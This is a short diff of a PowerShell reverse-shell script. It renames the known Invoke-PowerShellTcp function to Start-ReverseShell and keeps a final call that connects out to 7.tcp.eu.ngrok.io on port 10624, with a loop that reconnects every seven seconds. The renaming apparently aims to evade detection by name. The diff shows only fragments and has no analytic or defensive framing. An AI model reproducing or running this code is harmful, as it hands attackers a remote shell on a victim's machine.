@@ -1,6 +1,6 @@
 # Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
-function Invoke-PowerShellTcp 
-{
+
+Start-ReverseShell {
 function ConvertFrom-ByteArray {
 
     Param (
@@ -62,5 +62,7 @@ while ($true) {
     $y.Close()
     Start-Sleep -Seconds 7
 }
+
 }
-Invoke-PowerShellTcp -Reverse -IPAddress 7.tcp.eu.ngrok.io -Port 10624
+
+Start-ReverseShell -Reverse -IPAddress 7.tcp.eu.ngrok.io -Port 10624
